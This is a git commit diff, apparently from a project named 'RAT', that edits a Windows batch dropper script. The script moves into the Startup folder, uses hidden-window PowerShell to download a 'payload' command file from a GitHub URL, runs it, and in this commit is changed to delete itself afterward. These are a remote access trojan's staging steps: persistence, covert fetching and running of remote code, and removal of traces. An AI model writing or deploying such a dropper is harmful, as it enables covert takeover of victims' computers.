3953b049490f65db5e7527649b47a54f10836459
peterpapath <peterpapath@gmail.com>
2024-10-26 17:47:46 +0300

    initial

--- initial.cmd
+++ initial.cmd
@@ -11,11 +11,11 @@ cd "%STARTUP%"
 
 @REM TODO: build stage2
 @REM write payloads to startup
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/peterpapath/RAT//tree/main/files/wget.cmd -OutFile wget.cmd"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/peterpapath/RAT/main/files/wget.cmd -OutFile wget.cmd"
 
 @REM run payload
 powershell ./wget.cmd
 
 @REM cd back to the initial directory
 cd "%INITIALPATH%"
-@REM del initial.cmd
+del initial.cmd
